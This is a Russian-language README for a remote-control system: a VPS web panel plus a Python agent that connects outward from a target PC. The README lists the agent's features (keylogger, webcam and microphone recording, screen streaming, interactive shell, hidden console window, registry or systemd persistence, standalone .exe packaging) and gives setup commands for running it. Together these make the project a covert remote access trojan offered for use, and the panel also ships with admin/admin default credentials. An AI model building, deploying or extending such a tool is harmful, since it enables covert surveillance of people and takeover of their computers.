## Архитектура проекта

- **Веб-панель (Django + Django Channels + Daphne)**:
  - Разворачивается на VPS
  - Предоставляет адаптивный веб-интерфейс в тёмной теме
  - Авторизация операторов по логину и паролю
  - Принимает входящие WebSocket-соединения от агентов (`ws://<VPS_IP>:8000/ws/agent/`)
  - Связывает браузер оператора с агентом в реальном времени через Relay-канал (Channel Layer)

- **Агент (`agent/agent.py`)**:
  - Устанавливается на подчиненный ПК (Windows / Linux)
  - Сам подключается к VPS наружу (пробивает NAT, не требует белого IP на целевом ПК)
  - Автоматически переподключается при обрыве связи каждые 5 секунд
  - Шифрует трафик Fernet-ключом на базе токена
  - Поддерживает полный стек: скриншоты, живой стрим экрана и веб-камеры, интерактивный shell, выполнение команд, файловый менеджер, кейлоггер, запись микрофона, автозапуск, удалённый перезапуск и обновление с GitHub.

## Инструкция по запуску

### 1. Веб-панель (на VPS)
```bash
# Установка зависимостей:
pip install -r requirements.txt

# Применение миграций:
cd panel
python manage.py migrate

# Создание суперпользователя (при первом запуске):
python manage.py createsuperuser

# Запуск ASGI-сервера:
python -m daphne -b 0.0.0.0 -p 8000 panel.asgi:application
# Или через корень проекта:
# python main.py panel --port 8000
```
Панель будет доступна по адресу: `http://<IP_ВАШЕГО_VPS>:8000`  
По умолчанию создан пользователь: `admin` / `admin`

### 2. Подключение агента (на управляемом ПК)
1. В веб-панели на главной странице нажмите кнопку **«+ Добавить»**.
2. Введите имя устройства и секретный токен (например, `token123`).
3. Панель сгенерирует UID (например, `a1b2c3d4`).
4. На целевом ПК запустите агента:
```bash
python agent/agent.py --vps ws://<IP_ВАШЕГО_VPS>:8000/ws/agent/ --uid <UID> --secret <TOKEN>
# Или через main.py:
# python main.py agent --vps ws://<IP_ВАШЕГО_VPS>:8000/ws/agent/ --uid <UID> --secret <TOKEN>
```

#### Дополнительные флаги агента:
- `--hidden` — скрыть окно консоли (только для Windows)
- `--install` — прописать в автозапуск (реестр Windows или systemd на Linux) и выйти
- `--uninstall` — удалить из автозапуска
- `--watchdog` — режим супервизора (автоперезапуск при падении и после обновлений)
- `--build-exe` — собрать в единый автономный `.exe` через PyInstaller
